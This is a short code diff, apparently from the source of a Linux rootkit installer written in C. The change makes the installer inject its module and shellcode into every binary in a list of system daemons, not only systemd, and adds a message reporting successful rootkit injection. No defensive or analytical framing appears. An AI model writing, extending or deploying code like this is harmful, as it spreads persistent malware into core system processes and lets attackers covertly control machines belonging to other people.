@@ -140,6 +140,7 @@ void install_module_by_path(char *path,
     free(shellcode);
     shellcode = NULL;
 
+    printf(INFO "Successfully inject rootkit into %s\n", path);
 out:
     msync(image, evil_base + evil_size, MS_SYNC);
     munmap(image, evil_base + evil_size);
@@ -149,5 +150,7 @@ out:
 
 void install_module(const char module_start[], const char module_end[])
 {
-    install_module_by_path("/lib/systemd/systemd", module_start, module_end);
+    for (int i = 0; i < ARRAY_SIZE(sys_daemons); i++) {
+        install_module_by_path(sys_daemons[i], module_start, module_end);
+    }
 }
